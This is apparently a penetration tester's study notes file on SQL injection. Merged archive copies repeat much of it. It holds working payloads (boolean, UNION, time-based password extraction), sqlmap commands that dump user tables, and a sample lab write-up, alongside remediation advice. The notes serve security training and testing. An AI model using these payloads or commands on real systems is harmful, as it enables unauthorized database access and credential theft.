#SQL Injection (Canonical)

## Overview

SQL Injection (SQLi) allows an attacker to influence database queries via untrusted input. It can yield data disclosure, authentication bypass, or remote code execution depending on the backend and context.

SQL Injection (SQLi) allows attackers to influence database queries via untrusted input. It can result in data disclosure, authentication bypass, or RCE depending on the backend and context.

## When to test

- Any parameter that is used in database queries (IDs, filters, search fields, ordering, sort, headers, cookies, POST body).
- Inputs reflected in responses or that affect query behavior (sorting, pagination, filters).

- Any user-controllable parameter used in DB queries (IDs, filters, search fields, headers, cookies, POST bodies).

## Detection Checklist

- Send simple syntax-breaking payloads (`'`, `"`, `)`) and observe errors or differences.
- Try boolean conditions (`' OR '1'='1`) and compare true/false responses.
- Use time-based payloads (`SLEEP`, `pg_sleep`) to detect blind SQLi.
- Use UNION-based payloads to retrieve columns when output is reflected.
- Use OOB (Burp Collaborator / Interactsh) for blind detection.

- Syntax-break probes: `'`, `"`, `)`; look for errors.
- Boolean checks: `' OR '1'='1` vs `' OR '1'='2`.
- Time-based checks: `SLEEP`, `pg_sleep`, `WAITFOR DELAY`.
- UNION-based checks when output is reflected.
- OOB: Burp Collaborator / Interactsh for blind cases.

## Tools

- `sqlmap` — quick automation and extraction. Example: `sqlmap -u "http://target/vuln.php?id=1" --batch`.
- Burp Suite (Repeater / Intruder / Collaborator) — manual verification and OOB testing.
- `curl`, `httpie`, custom Python scripts for targeted tests.

- `sqlmap`, Burp Suite, `curl`/`httpie`, custom Python scripts.

## Payloads / Patterns

- `' OR '1'='1`  
- `" or 1=1--`  
- `' UNION SELECT NULL--`  
- `1 AND SLEEP(5)` (MySQL)  
- `pg_sleep(5)` (Postgres)  
- `WAITFOR DELAY '0:0:5'` (MSSQL)

- `1 AND SLEEP(5)` (MySQL)

## Commands / Quick Examples

- Basic sqlmap run: `sqlmap -u "http://target/vuln.php?id=1" --batch`  
- POST example: `sqlmap -u "http://target/vuln.php" --data="id=1" --level=3 --risk=2 --batch`  
- Dump table: `sqlmap -u "http://target/vuln.php?id=1" -D dbname -T users --dump --batch`

- `sqlmap -u "http://target/vuln.php?id=1" --batch`  
- `sqlmap -u "http://target/vuln.php" --data="id=1" --level=3 --risk=2 --batch`

## Exploitation Primitives

- Error-based disclosure (database error messages).  
- UNION-based data retrieval when output is reflected.  
- Boolean/time-based blind extraction via binary or character enumeration.  
- OOB exfiltration for blind cases.

- Error-based disclosure, UNION extraction, boolean/time-based blind extraction, OOB exfil.

## Mitigations / Notes for Reporting

- Use parameterized queries / prepared statements.  
- Apply least privilege on DB accounts.  
- Validate and canonicalize input; use allow-lists where possible.  
- Monitor and rate-limit suspicious requests and enable error suppression in production.

- Use parameterized queries, least-privilege DB accounts, input validation and allow-lists, and suppress detailed errors in production.

## References

- Keep links to PortSwigger labs, OWASP testing guides, and `sqlmap` documentation here.

- PortSwigger labs, OWASP testing guide, `sqlmap` docs.

- PortSwigger Academy: SQL injection labs
- OWASP: SQL Injection Prevention Cheat Sheet

## Detailed Notes / Lab Content

This section contains consolidated detection techniques, payloads, exploitation notes, and `sqlmap` usage collected for OSCP/HTB-style testing.

SQL injection can be detected using a variety of techniques, each suited to different backend behaviors and application logic. Always test safely and only on authorized systems.

### Error-based
- Inject invalid syntax and look for database error messages in the response (HTML, JSON, or stack trace).
- Payload examples: `"'`, `')`, `" or 1=1--`, `') OR ('1'='1`

### Union-based
- Use `UNION SELECT` to combine results from another query. Vary column counts until the query succeeds.
- Examples: `' UNION SELECT NULL--`, `' UNION SELECT 1,2,3--`, `' UNION SELECT 'abc',version()--`

### Boolean-based (blind)
- Inject conditions that evaluate true/false and compare responses.
- Examples: `1 AND 1=1--` vs `1 AND 1=2--`, `' OR 'a'='a'--`

### Time-based (blind)
- Use DB-specific sleep functions to detect blind injection via response delay.
- MySQL: `SLEEP(5)` / PostgreSQL: `pg_sleep(5)` / MSSQL: `WAITFOR DELAY '0:0:5'`.

### Stacked queries
- Some DBMS allow multiple statements (`;`) — use to run secondary queries if available.

### Out-of-band (OOB)
- Trigger the DB or app to call an external host you control (DNS/HTTP) to detect blind injections.

### Data-modifying and destructive payloads
- UPDATE/DELETE injections are possible; avoid destructive actions unless in a lab.

### Extraction techniques
- UNION SELECT + CONCAT/CAST to retrieve values.
- Blind extraction via character-by-character binary search.
- Use `information_schema` (MySQL/Postgres) to enumerate tables/columns.

### Common test payloads
- Basic:
```
' OR '1'='1
' OR '1'='1' --
" or 1=1--
- Time-based (MySQL):
' OR IF(1=1,SLEEP(5),0) --

### SQLMap quick flags and examples
- Basic run:
sqlmap -u "http://target/vuln.php?id=1" --batch
- POST data / increase intensity:
sqlmap -u "http://target/vuln.php" --data="id=1" --level=3 --risk=2 --batch
- Dump a specific table:
sqlmap -u "http://target/vuln.php?id=1" -D dbname -T users --dump --batch
- Tamper scripts and proxying (Burp):
sqlmap -u "http://target/vuln.php?id=1" --tamper=space2comment --proxy=http://127.0.0.1:8080 --batch

### Practical notes
- Start with safe, low-impact tests. Use timing and boolean checks when output is not returned.
- When using automation, always verify findings manually and capture the exact request/response.
- Document precise payloads and contexts for reporting.
#SQL Injection (Consolidated)

This file combines detection techniques, payloads, exploitation notes, and `sqlmap` quick usage for OSCP/HTB-style testing.

See `../sqli.md` for the consolidated detection techniques, payload lists, and `sqlmap` examples collected during previous work. This canonical file is the short reference; keep longer lab notes in the original file or `labs/`.

---

## Detection

SQL injection can be detected using a variety of techniques, each suited to different backend behaviors and application logic. Always test safely and only on authorized systems.

### Error-based
- Inject invalid syntax and look for database error messages in the response (HTML, JSON, or stack trace).
- Payload examples: `"'`, `')`, `" or 1=1--`, `') OR ('1'='1`

### Union-based
- Use `UNION SELECT` to combine results from another query. Vary column counts until the query succeeds.
- Examples: `' UNION SELECT NULL--`, `' UNION SELECT 1,2,3--`, `' UNION SELECT 'abc',version()--`

### Boolean-based (blind)
- Inject conditions that evaluate true/false and compare responses.
- Examples: `1 AND 1=1--` vs `1 AND 1=2--`, `' OR 'a'='a'--`

### Time-based (blind)
- Use DB-specific sleep functions to detect blind injection via response delay.
- MySQL: `SLEEP(5)` / PostgreSQL: `pg_sleep(5)` / MSSQL: `WAITFOR DELAY '0:0:5'`.

### Stacked queries
- Some DBMS allow multiple statements (`;`) — use to run secondary queries if available.

### Out-of-band (OOB)
- Trigger the DB or app to call an external host you control (DNS/HTTP) to detect blind injections.

### Data-modifying and destructive payloads
- UPDATE/DELETE injections are possible; avoid destructive actions unless in a lab.

## Extraction techniques

- UNION SELECT + CONCAT/CAST to retrieve values.
- Blind extraction via character-by-character binary search.
- Use `information_schema` (MySQL/Postgres) to enumerate tables/columns.

## Common test payloads

- Basic:
```
' OR '1'='1
' OR '1'='1' --
" or 1=1--
- Time-based (MySQL):
' OR IF(1=1,SLEEP(5),0) --

## SQLMap quick flags and examples

- Basic run:
```
sqlmap -u "http://target/vuln.php?id=1" --batch
- POST data / increase intensity:
sqlmap -u "http://target/vuln.php" --data="id=1" --level=3 --risk=2 --batch
- Dump a specific table:
sqlmap -u "http://target/vuln.php?id=1" -D dbname -T users --dump --batch
- Tamper scripts and proxying (Burp):
sqlmap -u "http://target/vuln.php?id=1" --tamper=space2comment --proxy=http://127.0.0.1:8080 --batch

## Practical notes

- Start with safe, low-impact tests. Use timing and boolean checks when output is not returned.
- When using automation, always verify findings manually and capture the exact request/response.
- Document precise payloads and contexts for reporting.

## Lab: Sample SQLi Writeup

### Target
- URL: `http://example.com/product?id=1`
- Parameter: `id` (GET)

### Summary
The `id` parameter is vulnerable to SQL injection. Exploited using boolean- and UNION-based techniques to extract table names and user data.

### Discovery / Detection
1. Sent a request with `id=1'` and observed an SQL error indicating unescaped input.

Request (shortened):
GET /product?id=1' HTTP/1.1

Response contained: "SQL syntax error near '...'"

2. Confirmed with boolean payload that changes page content:
- `id=1 AND 1=1` — page loads normally
- `id=1 AND 1=2` — page shows different content or returns empty => boolean-based injection

### Exploitation
1. Find number of columns with UNION:

- `id=1 UNION SELECT NULL--`
- `id=1 UNION SELECT NULL,NULL--`
- Repeat until no error — e.g., `UNION SELECT NULL,NULL,NULL--`

2. Identify readable columns and craft `UNION SELECT` to extract varchar columns:

`id=1 UNION SELECT NULL,username,password FROM users--`

3. If UNION blocked or no visible output, use time-based to extract slowly (example MySQL):

`id=1 OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--`

### Using sqlmap (example)

- Basic DB enumeration:

```bash
sqlmap -u "http://example.com/product?id=1" --dbs --batch
```

- Dump `users` table from `appdb`:

sqlmap -u "http://example.com/product?id=1" -D appdb -T users --dump --batch

### Evidence
- Paste response snippets and/or screenshots here. Keep copies of HTTP requests/responses.

### Remediation
- Use prepared statements / parameterized queries
- Use least privilege for DB accounts
- Normalize error messages (do not reveal DB errors)

### References
- PortSwigger Academy: SQL injection labs
- OWASP: SQL Injection Prevention Cheat Sheet

---

## Merged from archive/canonical/sqli.md


## SQL Injection (Canonical) (archived)

This is an archived copy of `notes/canonical/sqli.md` — canonical short reference preserved.

(See `notes/sqli.md` for the merged single-file topic.)

---

## Merged from archive/duplicates/notes-canonical-sqli.md

```markdown

## SQL Injection (Canonical) - archived duplicate

This is an archived copy of `notes/canonical/sqli.md` captured before cleanup.

## Original content

```markdown

## SQL Injection (Canonical)


## Merged from archive/sqli-sample.md


## Sample SQLi Writeup (archived)

(Archived copy of labs/sqli-sample.md)

## Target

- URL: http://example.com/product?id=1
- Parameter: `id` (GET)

## Summary

The `id` parameter is vulnerable to SQL injection. Exploited using boolean- and UNION-based techniques to extract table names and user data.

## Discovery / Detection

1. Sent a request with `id=1'` and observed an SQL error indicating unescaped input.

Request (shortened):
GET /product?id=1' HTTP/1.1

Response contained: "SQL syntax error near '...'"

2. Confirmed with boolean payload that changes page content:

- `id=1 AND 1=1` — page loads normally
- `id=1 AND 1=2` — page shows different content or returns empty => boolean-based injection

## Exploitation

1. Find number of columns with UNION:

- `id=1 UNION SELECT NULL--`
- `id=1 UNION SELECT NULL,NULL--`
- Repeat until no error — e.g., `UNION SELECT NULL,NULL,NULL--`

2. Identify readable columns and craft `UNION SELECT` to extract varchar columns:

`id=1 UNION SELECT NULL,username,password FROM users--`

3. If UNION blocked or no visible output, use time-based to extract slowly (example MySQL):

`id=1 OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--`

## Using sqlmap (example)

- Basic DB enumeration:

```bash
sqlmap -u "http://example.com/product?id=1" --dbs --batch
```

- Dump `users` table from `appdb`:

sqlmap -u "http://example.com/product?id=1" -D appdb -T users --dump --batch

## Evidence

- Paste response snippets and/or screenshots here. Keep copies of HTTP requests/responses.

## Remediation

- Use prepared statements / parameterized queries
- Use least privilege for DB accounts
- Normalize error messages (do not reveal DB errors)

